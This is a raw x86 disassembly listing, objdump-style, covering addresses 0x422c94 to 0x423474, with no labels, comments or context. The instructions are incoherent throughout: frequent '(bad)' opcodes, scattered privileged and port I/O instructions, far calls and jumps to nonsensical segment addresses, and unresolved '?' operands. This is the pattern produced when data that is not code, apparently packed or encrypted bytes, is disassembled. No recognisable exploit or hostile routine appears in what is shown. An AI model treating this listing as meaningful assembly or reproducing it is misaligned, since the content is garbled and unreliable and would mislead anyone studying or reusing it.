  422c94:	cmp    BYTE PTR [edx],bh
  422c96:	cmp    BYTE PTR [ebp-0x5a5d74a6],0xd5
  422c9d:	test   eax,0x29a8beca
  422ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ca3:	mov    bl,0x7d
  422ca5:	test   DWORD PTR [ecx],edi
  422ca7:	sti    
  422ca8:	inc    ebx
  422ca9:	dec    eax
  422caa:	sbb    BYTE PTR [edx+0x7a6e21c2],cl
  422cb0:	ins    DWORD PTR es:[edi],dx
  422cb1:	lahf   
  422cb2:	mov    edx,0x4bad7b9b
  422cb7:	cmc    
  422cb8:	dec    esi
  422cb9:	mov    dl,BYTE PTR [ecx+0x46]
  422cbc:	and    ah,BYTE PTR ds:0x6b40d98e
  422cc2:	ds jp  0x422c65
  422cc5:	(bad)  
  422cc6:	sti    
  422cc7:	mov    bl,0x6c
  422cc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cca:	xchg   DWORD PTR [edx+0x52],edx
  422ccd:	jo     0x422c97
  422ccf:	(bad)  
  422cd0:	push   ebx
  422cd1:	mov    WORD PTR [edx-0x2f],es
  422cd4:	push   es
  422cd5:	mov    ebx,0xba3cd7df
  422cda:	les    edi,FWORD PTR [eax]
  422cdc:	xchg   edx,eax
  422cdd:	je     0x422d32
  422cdf:	push   edx
  422ce0:	sahf   
  422ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ce2:	test   BYTE PTR gs:[eax+ebx*4+0x6efe8b62],dl
  422cea:	cmp    ebx,DWORD PTR [esi+edi*8-0x15]
  422cee:	or     edx,DWORD PTR [edi+0x72]
  422cf1:	fnstsw WORD PTR [esi-0xa]
  422cf4:	cs retf 0xbd2a
  422cf8:	test   eax,0x938bb1f4
  422cfd:	sbb    al,0x61
  422cff:	call   0xa3bbd601
  422d04:	call   0x57565204
  422d09:	fcmovb st,st(6)
  422d0b:	jmp    0x291ec939
  422d10:	mov    eax,ds:0x96a5c6ea
  422d15:	jmp    0xccb4:0x42a7914c
  422d1c:	ins    DWORD PTR es:[edi],dx
  422d1d:	pop    es
  422d1e:	cmp    BYTE PTR [eax],cl
  422d20:	sbb    DWORD PTR [eax+0x2482665f],0x96392c10
  422d2a:	cld    
  422d2b:	(bad)  
  422d2c:	cs mov dl,0x98
  422d2f:	dec    edx
  422d30:	mov    dl,0xc3
  422d32:	stos   DWORD PTR es:[edi],eax
  422d33:	and    al,0x0
  422d35:	outs   dx,DWORD PTR ds:[esi]
  422d36:	clc    
  422d37:	stos   DWORD PTR es:[edi],eax
  422d38:	iret   
  422d39:	inc    eax
  422d3a:	xor    BYTE PTR [ebp-0x36461ffd],0xd
  422d41:	out    dx,al
  422d42:	or     eax,0xcb075843
  422d47:	pop    ds
  422d48:	jae    0x422d64
  422d4a:	mov    WORD PTR [eax+eax*8+0x384f9d2b],es
  422d51:	mov    eax,ds:0x84b72930
  422d56:	inc    ebp
  422d57:	inc    edi
  422d58:	dec    edx
  422d59:	(bad)  
  422d5a:	cmp    ch,BYTE PTR ds:0x1fd3246e
  422d60:	or     ecx,DWORD PTR [ebp-0x53]
  422d63:	rol    DWORD PTR [edx],cl
  422d65:	pushf  
  422d66:	out    0xa0,al
  422d68:	xor    ecx,0xf51e8de9
  422d6e:	jp     0x422d7f
  422d70:	into   
  422d71:	imul   esi,DWORD PTR [edx],0xffffff94
  422d74:	shl    BYTE PTR [esi-0x4a1a0acd],cl
  422d7a:	push   ebp
  422d7b:	leave  
  422d7c:	pop    esi
  422d7d:	adc    esi,DWORD PTR [edi+0x23]
  422d80:	dec    ecx
  422d81:	call   0x13b9:0x520cb0ac
  422d88:	fst    QWORD PTR [edx+0x64]
  422d8b:	sbb    eax,0x202a6343
  422d90:	push   edx
  422d91:	outs   dx,BYTE PTR ds:[esi]
  422d92:	xchg   BYTE PTR [edx-0x5c],ah
  422d95:	sub    al,0xc8
  422d97:	xor    DWORD PTR [ecx-0x4d],esi
  422d9a:	sbb    al,dl
  422d9c:	loop   0x422d46
  422d9e:	test   DWORD PTR [edx],ebp
  422da0:	ins    BYTE PTR es:[edi],dx
  422da1:	imul   esi,DWORD PTR [eax+0x152f07d5],0xa080264c
  422dab:	sub    BYTE PTR [ebx],0x81
  422dae:	or     BYTE PTR [ebx],ch
  422db0:	popf   
  422db1:	nop
  422db2:	jae    0x422e16
  422db4:	(bad)  
  422db5:	jecxz  0x422d74
  422db7:	adc    al,0x46
  422db9:	inc    ebx
  422dba:	mov    fs:0x98f77c50,al
  422dc0:	aam    0xd9
  422dc2:	imul   ecx,DWORD PTR [esi+0x657cf26],0x9b23cdb1
  422dcc:	inc    eax
  422dcd:	ss push ebp
  422dcf:	xchg   edx,eax
  422dd0:	cmp    al,0xef
  422dd2:	pop    ss
  422dd3:	add    ah,cl
  422dd5:	xlat   BYTE PTR ds:[ebx]
  422dd6:	imul   ecx,ecx,0x60
  422dd9:	repnz xchg esp,eax
  422ddb:	mov    dh,0x50
  422ddd:	test   bl,bh
  422ddf:	adc    al,0x1
  422de1:	bound  ebx,QWORD PTR [ebp-0x5b]
  422de4:	pop    ds
  422de5:	lahf   
  422de6:	jl     0x422dc5
  422de8:	sbb    bl,bl
  422dea:	shl    BYTE PTR [esi+0x522a888d],0x5f
  422df1:	pop    eax
  422df2:	and    al,0x1a
  422df4:	int3   
  422df5:	jle    0x422e19
  422df7:	mov    esi,DWORD PTR [eax+0x20f15538]
  422dfd:	and    esi,DWORD PTR [ebx-0x6b948dc4]
  422e03:	pop    ebx
  422e04:	fs or  cl,cl
  422e07:	test   eax,0x299fa955
  422e0c:	sub    al,0x8b
  422e0e:	ret    0x42d2
  422e11:	stos   BYTE PTR es:[edi],al
  422e12:	jnp    0x422df5
  422e14:	and    BYTE PTR [edi+0x57],dh
  422e17:	mov    ecx,0x601b68be
  422e1c:	popf   
  422e1d:	call   0xb9a4:0xb392f89
  422e24:	shr    BYTE PTR [ecx],0xfd
  422e27:	outs   dx,DWORD PTR ds:[esi]
  422e28:	cmp    DWORD PTR [eax-0x59],edx
  422e2b:	shr    DWORD PTR [ecx],0xc1
  422e2e:	enter  0x1779,0x95
  422e32:	fsubr  QWORD PTR [eax]
  422e34:	out    0xf8,eax
  422e36:	mul    DWORD PTR [ecx+0x4d]
  422e39:	jbe    0x422eb1
  422e3b:	sub    DWORD PTR [ecx],esi
  422e3d:	add    al,al
  422e3f:	(bad)  
  422e40:	fidivr WORD PTR [esi]
  422e42:	inc    ebx
  422e43:	inc    edx
  422e44:	(bad)  
  422e45:	push   ss
  422e46:	xchg   esp,eax
  422e47:	fidiv  WORD PTR [esi-0x24]
  422e4a:	mov    edx,0x3e190083
  422e4f:	(bad)  
  422e50:	pop    edi
  422e51:	lds    edx,FWORD PTR [ebp-0x6d]
  422e54:	(bad)  
  422e55:	iret   
  422e56:	cs push eax
  422e58:	stos   DWORD PTR es:[edi],eax
  422e59:	call   0x5d7b:0xaf170100
  422e60:	cmc    
  422e61:	leave  
  422e62:	call   0xa659079e
  422e67:	sub    eax,0xd29debc0
  422e6c:	and    al,0xd7
  422e6e:	inc    ecx
  422e6f:	push   edi
  422e70:	rcl    BYTE PTR [edi],1
  422e72:	lods   al,BYTE PTR ds:[esi]
  422e73:	sbb    DWORD PTR [ecx+0x558386d4],0x8
  422e7a:	lds    esp,FWORD PTR [ebp+0x39]
  422e7d:	scas   al,BYTE PTR es:[edi]
  422e7e:	aam    0x46
  422e80:	sahf   
  422e81:	mov    ah,0x92
  422e83:	bound  esp,QWORD PTR [edx+0xe6f4ef]
  422e89:	fiadd  DWORD PTR ds:[eax+0x4722cfb9]
  422e90:	jae    0x422e6e
  422e92:	test   BYTE PTR [edi+esi*4],bh
  422e95:	retf   
  422e96:	daa    
  422e97:	mov    BYTE PTR [edx+0x5d],cl
  422e9a:	scas   al,BYTE PTR es:[edi]
  422e9b:	jl     0x422e72
  422e9d:	popf   
  422e9e:	add    BYTE PTR [ecx],cl
  422ea0:	jb     0x422e66
  422ea2:	mov    ecx,0xa5f9bc2a
  422ea7:	fsubr  DWORD PTR [edi-0x70]
  422eaa:	lods   eax,DWORD PTR ds:[esi]
  422eab:	ins    DWORD PTR es:[edi],dx
  422eac:	ins    BYTE PTR es:[edi],dx
  422ead:	inc    edx
  422eae:	retf   
  422eaf:	stos   BYTE PTR es:[edi],al
  422eb0:	jge    0x422e40
  422eb2:	push   ebx
  422eb3:	stos   DWORD PTR es:[edi],eax
  422eb4:	mov    esi,0xa4166886
  422eb9:	lea    ebx,[eax+0x7d]
  422ebc:	shl    BYTE PTR [ebx+edi*4+0x70],cl
  422ec0:	(bad)  
  422ec1:	mov    edx,DWORD PTR [edx]
  422ec3:	cmovo  esp,DWORD PTR [eiz*4-0xf3c4d02]
  422ecb:	sub    edx,DWORD PTR [ebp+0x56]
  422ece:	adc    eax,0x9b56d75d
  422ed3:	or     ebx,DWORD PTR ds:0xefae448f
  422ed9:	and    al,0x5f
  422edb:	inc    ebp
  422edd:	mov    edx,0x49218eb3
  422ee2:	mov    bh,0x39
  422ee4:	pop    es
  422ee5:	push   es
  422ee6:	pshufw mm5,QWORD PTR gs:[edx],0x7f
  422eeb:	enter  0x223f,0x73
  422eef:	jmp    0x16a4:0xad1ac48
  422ef6:	cdq    
  422ef7:	in     eax,0x5e
  422ef9:	fimul  WORD PTR [eax-0x72]
  422efc:	xchg   edi,eax
  422efd:	jns    0x422ef1
  422eff:	in     eax,dx
  422f00:	sbb    al,0x8d
  422f02:	call   0x21da3d7a
  422f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f08:	cmp    BYTE PTR [eax-0x71c02dd9],ah
  422f0e:	js     0x422f1b
  422f10:	jle    0x422f27
  422f12:	cmp    eax,0x543a28ff
  422f17:	jne    0x422f72
  422f19:	inc    ecx
  422f1a:	cmp    eax,DWORD PTR [edx]
  422f1c:	mov    ds:0xa8f37d2e,eax
  422f21:	sbb    cl,BYTE PTR [edx+0x286d6e6d]
  422f27:	or     esi,edx
  422f29:	dec    DWORD PTR [edx]
  422f2b:	mov    cl,0x8b
  422f2d:	push   ebp
  422f2e:	cmp    eax,0x9937ef14
  422f33:	dec    dl
  422f35:	mov    cs,WORD PTR [ebx]
  422f37:	mov    al,0xc8
  422f39:	shl    ah,0xf9
  422f3c:	dec    esi
  422f3d:	aaa    
  422f3e:	(bad)
  422f41:	pop    edx
  422f42:	adc    ecx,DWORD PTR [edx+0x155008da]
  422f48:	jnp    0x422f79
  422f4a:	push   eax
  422f4b:	sub    al,0x9
  422f4d:	pop    edx
  422f4e:	cmp    eax,0x93eb5fa7
  422f53:	pop    ebp
  422f54:	cli    
  422f55:	mov    ah,0xe9
  422f57:	xor    bl,BYTE PTR [edx-0x28]
  422f5a:	(bad)  
  422f5b:	pop    ecx
  422f5c:	daa    
  422f5d:	test   dh,bl
  422f5f:	mov    ebp,0xf69cf44d
  422f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f65:	pop    ds
  422f66:	push   ebx
  422f67:	pop    esi
  422f68:	cmp    edx,esi
  422f6a:	add    DWORD PTR [edx],ebp
  422f6c:	or     eax,0x6f503c32
  422f71:	xchg   esi,eax
  422f72:	(bad)  
  422f74:	fnsave ds:0x5089980a
  422f7a:	pop    esp
  422f7b:	(bad)  
  422f7c:	and    al,dh
  422f7e:	into   
  422f7f:	dec    ecx
  422f80:	fmul   st,st(1)
  422f82:	jl     0x422f5d
  422f84:	pop    edx
  422f85:	test   al,0x3
  422f87:	cmp    al,0x8c
  422f89:	mov    cl,ah
  422f8b:	inc    esi
  422f8c:	addr16 jmp 0x422f91
  422f8f:	dec    ebx
  422f90:	popf   
  422f91:	int3   
  422f92:	dec    ecx
  422f93:	ja     0x422fa5
  422f95:	rcl    BYTE PTR [ebx-0x13],cl
  422f98:	sbb    DWORD PTR [edi+0x7995bb5c],edi
  422f9e:	sub    bh,BYTE PTR [esp+edi*1-0x6f]
  422fa2:	jmp    0x3c5339c3
  422fa7:	mov    esp,0x76e1f7bf
  422fac:	mov    cs,WORD PTR [edi]
  422fae:	lods   al,BYTE PTR ds:[esi]
  422faf:	(bad)  
  422fb0:	test   al,0x93
  422fb2:	mov    ds,WORD PTR [ebx+0x37]
  422fb5:	inc    edx
  422fb6:	cli    
  422fb7:	lea    edx,[edi-0x41]
  422fba:	push   ebp
  422fbb:	sub    ch,BYTE PTR [esi+edi*8+0x15]
  422fbf:	fldcw  WORD PTR [edi-0x3620174e]
  422fc5:	pop    ds
  422fc6:	jp     0x422fdb
  422fc8:	adc    al,0xc4
  422fca:	inc    edi
  422fcb:	cmp    edx,DWORD PTR [ebp-0x7bd48b17]
  422fd1:	dec    ecx
  422fd2:	retf   0x96f0
  422fd5:	retf   
  422fd6:	sahf   
  422fd7:	das    
  422fd8:	push   ebp
  422fd9:	inc    eax
  422fda:	loopne 0x422fde
  422fdc:	sbb    eax,0x31713852
  422fe1:	lods   al,BYTE PTR ds:[esi]
  422fe2:	xchg   ecx,eax
  422fe3:	push   eax
  422fe4:	ja     0x422ff8
  422fe6:	out    dx,eax
  422fe7:	adc    ebx,DWORD PTR [eax-0x2372dc1a]
  422fed:	push   ds
  422fee:	sub    DWORD PTR [edx-0x39],ebp
  422ff1:	xchg   ecx,eax
  422ff2:	cwde   
  422ff3:	adc    BYTE PTR [ecx],al
  422ff5:	jmp    0xe0471bb2
  422ffa:	or     ebx,DWORD PTR [edi]
  422ffc:	retf   
  422ffd:	pop    eax
  422ffe:	outs   dx,DWORD PTR ds:[esi]
  422fff:	nop
  423000:	mov    ds:0xede4cb4d,al
  423005:	fwait
  423006:	icebp  
  423007:	push   0xffffffef
  423009:	jp     0x422f95
  42300b:	dec    edi
  42300c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42300d:	adc    ebp,esp
  42300f:	in     al,dx
  423010:	fisttp DWORD PTR [edi+0x46]
  423013:	push   esi
  423014:	test   eax,0x51985561
  423019:	sti    
  42301a:	lahf   
  42301b:	xor    BYTE PTR [edx-0x290b3fa3],ah
  423021:	lahf   
  423022:	cmp    eax,0x820b3b74
  423027:	sbb    DWORD PTR [ebp-0x17],edx
  42302a:	aas    
  42302b:	inc    edi
  42302c:	je     0x42305b
  42302e:	lea    eax,[ebp+0x284fb3ca]
  423034:	cmc    
  423035:	fwait
  423036:	jecxz  0x423090
  423038:	fsubr  QWORD PTR [ebx+0x7ac18699]
  42303e:	sahf   
  42303f:	cmp    DWORD PTR [esi+0x5edac7c2],edi
  423045:	mov    ebx,0x79ea7415
  42304a:	add    DWORD PTR [ecx-0xb5202ae],ebp
  423050:	sbb    eax,ecx
  423052:	dec    edi
  423053:	jno    0x422fdf
  423055:	aaa    
  423056:	aad    0x31
  423058:	das    
  423059:	sub    eax,0x98706235
  42305e:	outs   dx,DWORD PTR ds:[esi]
  42305f:	push   es
  423060:	inc    eax
  423061:	ret    
  423062:	imul   edx,DWORD PTR [edx+0x5a],0x66
  423066:	retf   
  423067:	pop    ss
  423068:	add    al,0x16
  42306a:	test   al,0xd6
  42306c:	(bad)  
  42306d:	and    eax,0x76d1c4da
  423072:	pop    ss
  423073:	clc    
  423074:	push   0x5dbd3e77
  423079:	(bad)  
  42307a:	je     0x4230ea
  42307c:	cwde   
  42307d:	pusha  
  42307e:	call   0xbb86:0xaca5dc9e
  423085:	xchg   esp,eax
  423086:	sub    edi,edx
  423088:	sbb    DWORD PTR ds:0xcf85f16f,edx
  42308e:	(bad)  
  42308f:	out    dx,al
  423090:	xor    BYTE PTR [ecx-0x3909a169],bh
  423096:	ret    0xfc3f
  423099:	pop    ebp
  42309a:	test   eax,0x82094767
  42309f:	sub    ecx,ebx
  4230a1:	ds dec eax
  4230a3:	ret    0x3309
  4230a6:	jne    0x4230ac
  4230a8:	xor    esi,edi
  4230aa:	cdq    
  4230ab:	mov    ?,WORD PTR ds:0xc19d2fe7
  4230b1:	outs   dx,DWORD PTR ds:[esi]
  4230b2:	dec    esi
  4230b3:	rcl    BYTE PTR [edx+0x145c9dd6],cl
  4230b9:	jp     0x4230d3
  4230bb:	mov    ch,0x0
  4230bd:	(bad)  
  4230be:	pop    esi
  4230bf:	xchg   BYTE PTR [ebx-0x7edbdf],ah
  4230c5:	adc    BYTE PTR [ecx-0x359d7b21],dl
  4230cb:	and    bh,BYTE PTR [eax-0x3ca4ea6b]
  4230d1:	cmp    al,0xdb
  4230d3:	push   ebp
  4230d4:	(bad)  
  4230d5:	mov    edx,0xa8ec9feb
  4230da:	nop
  4230db:	sub    DWORD PTR [eax+esi*2+0x49ad8c23],esp
  4230e2:	mov    edi,0x4f27933c
  4230e7:	jmp    0x4230c0
  4230e9:	inc    ecx
  4230ea:	leave  
  4230eb:	adc    al,0x35
  4230ed:	je     0x423099
  4230ef:	(bad)  
  4230f1:	xor    BYTE PTR ds:0xa08282e7,bh
  4230f7:	pop    ebp
  4230f8:	jnp    0x423145
  4230fa:	daa    
  4230fb:	and    eax,0x97e9d7ba
  423100:	lock in eax,0x68
  423103:	jae    0x423175
  423105:	jb     0x4230c4
  423107:	fisubr DWORD PTR [esi+0x3f097488]
  42310d:	inc    ebp
  42310e:	jne    0x423110
  423110:	sbb    ebx,eax
  423112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423113:	jle    0x4230c3
  423115:	ds aad 0xaf
  423118:	loopne 0x423164
  42311a:	sub    al,0xa
  42311c:	cmp    bh,BYTE PTR [ebx-0x3b]
  42311f:	sar    DWORD PTR [edi+0x3e],cl
  423122:	ins    BYTE PTR es:[edi],dx
  423123:	stos   BYTE PTR es:[edi],al
  423124:	ret    
  423125:	xor    BYTE PTR [ecx-0x77],al
  423128:	push   ss
  423129:	push   ds
  42312a:	nop
  42312b:	jmp    0x423116
  42312d:	(bad)  
  42312e:	mov    dh,cl
  423130:	jnp    0x423198
  423132:	jo     0x423192
  423134:	into   
  423135:	rol    DWORD PTR [eax+0x23a61ec1],0x5d
  42313c:	(bad)
  423140:	cld    
  423141:	out    dx,al
  423142:	push   esp
  423143:	shl    DWORD PTR [ebp+0x7],cl
  423146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423147:	iret   
  423148:	dec    eax
  423149:	pop    edx
  42314a:	repz xor DWORD PTR ds:0xb14920a6,ebx
  423151:	pop    esi
  423152:	and    BYTE PTR ds:0xa62ec056,dl
  423158:	into   
  423159:	or     eax,0xe86b9f53
  42315e:	dec    esi
  42315f:	in     eax,0x47
  423161:	ins    BYTE PTR es:[edi],dx
  423162:	aam    0x54
  423164:	sahf   
  423165:	fwait
  423166:	sahf   
  423167:	push   esp
  423168:	cmp    BYTE PTR [eax],ch
  42316a:	loope  0x423142
  42316c:	gs test cl,al
  42316f:	stos   BYTE PTR es:[edi],al
  423170:	call   esp
  423172:	jns    0x423120
  423174:	xor    BYTE PTR [ecx-0x4b11cd14],dl
  42317a:	lock aad 0x3d
  42317d:	test   DWORD PTR [edx+0x5a],esp
  423180:	mov    ebp,0xc574f2e4
  423185:	pushf  
  423186:	fimul  DWORD PTR [ecx-0x65682b8]
  42318c:	lock xchg DWORD PTR [eax+0x39aba0a8],ebp
  423193:	or     ebp,DWORD PTR [esi]
  423195:	mov    cs,ecx
  423197:	inc    esi
  423198:	dec    edx
  423199:	inc    esp
  42319a:	cwde   
  42319b:	stos   BYTE PTR es:[edi],al
  42319c:	pop    ecx
  42319d:	sub    eax,0xdd1704e7
  4231a2:	stos   DWORD PTR es:[edi],eax
  4231a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231a4:	in     al,dx
  4231a5:	cmp    al,0x8e
  4231a7:	ret    0x2bd4
  4231aa:	pop    ebx
  4231ab:	mov    eax,ecx
  4231ad:	push   0xd7d4d204
  4231b2:	mov    esp,0x1399bf17
  4231b7:	inc    ecx
  4231b8:	and    eax,0xec23951f
  4231bd:	mov    WORD PTR [ecx],es
  4231bf:	call   0xa685:0x948a5c55
  4231c6:	xor    DWORD PTR [ebx],0x15
  4231c9:	mov    ch,0xd4
  4231cb:	fbstp  TBYTE PTR [eax-0x75]
  4231ce:	and    bl,BYTE PTR [esi-0x1b]
  4231d1:	cmp    BYTE PTR [esi-0x3b8bd77b],ah
  4231d7:	not    BYTE PTR [esp+ebp*4-0x273cdf27]
  4231de:	jne    0x4231c7
  4231e0:	imul   ecx,DWORD PTR [edi+0x1dff77f6],0xb8ebe663
  4231ea:	add    esp,DWORD PTR [ecx]
  4231ec:	push   cs
  4231ed:	mov    al,0xa2
  4231ef:	jae    0x423242
  4231f1:	repnz (bad) 
  4231f3:	jp     0x4231ab
  4231f5:	dec    ebx
  4231f6:	aam    0x36
  4231f8:	xchg   esi,eax
  4231f9:	add    DWORD PTR [edx],edx
  4231fb:	inc    esp
  4231fc:	and    dl,BYTE PTR ds:0xfb3b0b9a
  423202:	sbb    DWORD PTR [ecx-0x17768116],0x54
  423209:	aam    0xd0
  42320b:	dec    esi
  42320c:	xchg   bh,ah
  42320e:	push   cs
  42320f:	jl     0x42328d
  423211:	jl     0x423229
  423213:	mov    ebp,0xea4c2b52
  423218:	push   ds
  423219:	arpl   WORD PTR [eax+0x6e],sp
  42321c:	sub    DWORD PTR [esi+ecx*4+0x2c],esp
  423220:	and    esp,edi
  423222:	lods   eax,DWORD PTR ds:[esi]
  423223:	mov    ebx,0x7b98f210
  423228:	jmp    0x423276
  42322a:	pop    es
  42322b:	neg    DWORD PTR [edi]
  42322d:	xchg   esp,eax
  42322e:	stc    
  42322f:	test   eax,0x17268e7e
  423234:	and    eax,0x2c4160e
  423239:	or     DWORD PTR [ebx],0x66
  42323c:	fwait
  42323d:	push   esp
  42323e:	adc    DWORD PTR [edi-0x6268ba88],ebx
  423244:	jg     0x423246
  423246:	and    DWORD PTR [eax+esi*8-0x4fb56028],eax
  42324d:	stc    
  42324e:	sbb    al,0xca
  423250:	in     eax,0x5d
  423252:	repz popa 
  423254:	push   esi
  423255:	xchg   esi,eax
  423256:	push   ss
  423257:	rol    DWORD PTR ds:0xcbc5b193,1
  42325d:	mov    WORD PTR [ebx-0x681dbd13],?
  423263:	outs   dx,DWORD PTR ds:[esi]
  423264:	add    DWORD PTR [esi+0x2d],esi
  423267:	ja     0x423278
  423269:	jmp    0x4232be
  42326b:	cmp    eax,DWORD PTR [esi-0x68]
  42326e:	aad    0xe2
  423270:	xor    eax,0x828976ce
  423275:	retf   
  423276:	sbb    bh,bl
  423278:	je     0x423258
  42327a:	call   0x3a286355
  42327f:	mov    DWORD PTR [edx+0x33],ebx
  423282:	cli    
  423283:	jae    0x423230
  423285:	xor    bh,BYTE PTR [eax-0x5e143270]
  42328b:	test   BYTE PTR [ecx],0xe6
  42328e:	repnz cmp eax,DWORD PTR [ecx-0x5cbcdb58]
  423295:	and    ecx,DWORD PTR [edx+eax*4]
  423298:	add    ecx,DWORD PTR [ebp+ecx*2+0x78]
  42329c:	jne    0x4232e9
  42329e:	jae    0x423271
  4232a0:	sub    bl,bl
  4232a2:	sub    DWORD PTR [esi-0x3a307c0a],esp
  4232a8:	fadd   st(6),st
  4232aa:	or     ebp,DWORD PTR [esi]
  4232ac:	inc    ebp
  4232ad:	add    al,BYTE PTR [edx+0x566afbba]
  4232b3:	lock sbb BYTE PTR [ebx+0x38],cl
  4232b7:	lods   eax,DWORD PTR ds:[esi]
  4232b9:	inc    esp
  4232ba:	mov    ?,WORD PTR [ebp+0x3433e7a4]
  4232c0:	xlat   BYTE PTR ds:[ebx]
  4232c1:	mov    eax,0xd7e21b4a
  4232c6:	add    ah,BYTE PTR [esi+0x1e286590]
  4232cc:	mov    dh,0x3a
  4232ce:	sahf   
  4232cf:	pop    ss
  4232d0:	mov    eax,gs
  4232d2:	mov    edx,0xfbf2a2c4
  4232d7:	loope  0x423283
  4232d9:	aad    0x8c
  4232db:	iret   
  4232dc:	push   ebx
  4232dd:	push   ds
  4232de:	popf   
  4232df:	outs   dx,DWORD PTR ds:[esi]
  4232e0:	fadd   st,st(6)
  4232e2:	pop    edx
  4232e3:	ret    
  4232e4:	or     esp,DWORD PTR [ebp+0x7a118f45]
  4232ea:	arpl   sp,bp
  4232ec:	fucomp st(0)
  4232ee:	inc    edx
  4232ef:	and    DWORD PTR [esi-0x74e272a6],edi
  4232f5:	lock xor BYTE PTR [ebx+0x5e],dh
  4232f9:	inc    edi
  4232fa:	(bad)  
  4232fb:	jae    0x4232c1
  4232fd:	outs   dx,BYTE PTR ds:[esi]
  4232fe:	repz add eax,ebx
  423301:	xchg   esp,eax
  423302:	cld    
  423303:	mov    ebp,0xa9b78bfe
  423308:	ret    0x119f
  42330b:	jg     0x423313
  42330d:	mov    BYTE PTR [edi-0x7e626b45],bl
  423313:	jge    0x42335e
  423315:	add    DWORD PTR cs:[ebp-0x40dfef58],ebp
  42331c:	shl    BYTE PTR [ebp-0x775c7a96],cl
  423322:	(bad)  
  423323:	fild   DWORD PTR [edi]
  423325:	jno    0x4232d6
  423327:	adc    DWORD PTR [ecx-0x7b],ebx
  42332a:	pop    ss
  42332b:	push   eax
  42332c:	shl    DWORD PTR [edi],1
  42332e:	in     al,dx
  42332f:	jne    0x423323
  423331:	jo     0x423326
  423333:	jbe    0x4232da
  423335:	out    0x2,eax
  423337:	xor    esp,esi
  423339:	xor    esp,ebx
  42333b:	outs   dx,DWORD PTR ds:[esi]
  42333c:	jns    0x4232f5
  42333e:	or     bh,dh
  423340:	ins    DWORD PTR es:[di],dx
  423342:	call   0x7922791b
  423347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423348:	pop    ss
  423349:	add    BYTE PTR [edi+0x27c54498],bl
  42334f:	cmp    al,0x1d
  423351:	(bad)  
  423352:	repnz das 
  423354:	retf   0x4a0c
  423357:	mov    ?,WORD PTR [edi-0xea79610]
  42335d:	sbb    eax,0xd434cb7b
  423362:	mov    edi,0x51ca4e36
  423367:	xchg   edi,eax
  423368:	call   0xb1cf:0xde86a02
  42336f:	dec    eax
  423370:	ins    DWORD PTR es:[edi],dx
  423371:	fild   DWORD PTR [edx]
  423373:	lahf   
  423374:	clc    
  423375:	call   0x1bc7b423
  42337a:	test   eax,0x312111fe
  42337f:	mov    ch,0x18
  423381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423382:	mov    cl,0x71
  423384:	cwde   
  423385:	and    DWORD PTR [ebx-0x45],eax
  423388:	or     edx,edx
  42338a:	xchg   ebp,eax
  42338b:	cmp    ebx,0x2b
  42338e:	dec    esp
  42338f:	aaa    
  423390:	jb     0x4233c4
  423392:	push   es
  423393:	sbb    ecx,edx
  423395:	jp     0x4233fa
  423397:	pushf  
  423398:	ret    
  423399:	popa   
  42339a:	and    esi,esi
  42339c:	cmp    bl,ch
  42339e:	retf   
  42339f:	iret   
  4233a0:	pop    eax
  4233a1:	jb     0x4233e9
  4233a3:	inc    ecx
  4233a4:	fwait
  4233a5:	jo     0x423394
  4233a7:	cld    
  4233a8:	push   esp
  4233a9:	push   ecx
  4233aa:	lock dec ebp
  4233ac:	cwde   
  4233ad:	and    esp,0xc517fae4
  4233b3:	(bad)  
  4233b4:	test   eax,0x649aa3fe
  4233b9:	daa    
  4233ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233bb:	push   0x9ead4470
  4233c0:	mov    ds:0xdf0f6165,eax
  4233c5:	push   ecx
  4233c6:	test   eax,0xe80df875
  4233cb:	repz push es
  4233cd:	dec    ecx
  4233ce:	pop    edi
  4233cf:	cmp    eax,0xf753af8b
  4233d4:	sbb    DWORD PTR [esp+ebx*8+0x5a],ebp
  4233d8:	ss das 
  4233da:	out    0x94,al
  4233dc:	nop
  4233dd:	daa    
  4233de:	pop    es
  4233df:	fst    QWORD PTR ds:0x212aabc7
  4233e5:	into   
  4233e6:	sbb    DWORD PTR [ebp-0x1fb78d18],eax
  4233ec:	mov    edx,0xf2934873
  4233f1:	ror    DWORD PTR [edi],cl
  4233f3:	push   es
  4233f4:	mov    bh,0x8b
  4233f6:	push   0x1c64f027
  4233fb:	sbb    dl,BYTE PTR [ebx-0x78]
  4233fe:	fld    TBYTE PTR [esi-0x1c]
  423401:	sub    BYTE PTR [eax-0x60],0x93
  423405:	push   esp
  423406:	sub    BYTE PTR [edi+0x7abd368e],ch
  42340c:	lods   al,BYTE PTR ds:[esi]
  42340d:	shl    BYTE PTR [eax],0x74
  423410:	les    ecx,FWORD PTR [ecx+0x8abd050]
  423416:	loopne 0x423476
  423418:	(bad)  
  42341a:	jmp    FWORD PTR [esi-0x13d8903a]
  423420:	inc    edi
  423421:	(bad)  
  423423:	call   0xd420:0xa94efcda
  42342a:	jmp    0x32b24b2d
  42342f:	pop    ebx
  423430:	in     eax,dx
  423431:	push   ebp
  423432:	push   esp
  423433:	jmp    0x98e4:0xa7450607
  42343a:	inc    ebp
  42343b:	push   es
  42343c:	add    DWORD PTR [ecx],edi
  42343e:	cwde   
  42343f:	push   ecx
  423440:	outs   dx,BYTE PTR fs:[esi]
  423442:	inc    DWORD PTR [ecx-0x5a2e805]
  423448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423449:	pop    es
  42344a:	push   ebp
  42344b:	and    eax,0xd07e7f1b
  423450:	cmp    eax,0xc947ee8a
  423455:	ja     0x423455
  423457:	aaa    
  423458:	or     DWORD PTR cs:0x43eeade2,ecx
  42345f:	outs   dx,DWORD PTR ds:[esi]
  423460:	mov    bh,0x7e
  423462:	(bad)  [ecx]
  423464:	and    ah,BYTE PTR [esi+0x46874ef6]
  42346a:	inc    ecx
  42346b:	or     DWORD PTR [ecx+0x2d8926a6],esp
  423471:	rcr    DWORD PTR [ebp-0x2b],1
  423474:	fdiv   st(6),st
